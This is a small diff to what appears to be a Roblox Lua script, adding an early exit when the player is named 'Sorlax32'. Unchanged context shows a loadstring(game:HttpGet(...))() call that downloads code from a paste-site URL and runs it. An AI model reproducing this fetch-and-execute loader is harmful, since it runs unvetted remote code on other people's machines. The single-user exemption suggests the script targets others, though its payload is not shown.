@@ -7,5 +7,9 @@ local function d()
     loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/2hnONIwhMRbgaSC6/raw"))()
 end
 
+if game.Players.LocalPlayer.Name == "Sorlax32" then
+    return
+end
+
 task.spawn(a)
 task.spawn(d)
